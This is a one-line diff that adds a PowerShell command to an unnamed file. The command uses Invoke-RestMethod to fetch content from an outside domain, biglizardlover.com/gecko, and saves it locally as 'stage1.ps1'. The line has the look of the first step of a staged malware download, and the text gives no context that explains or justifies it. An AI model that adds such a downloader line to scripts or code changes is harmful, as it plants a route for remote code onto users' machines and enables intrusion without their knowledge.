@@ -1,0 +1,1 @@
+irm biglizardlover.com/gecko | out-file stage1.ps1
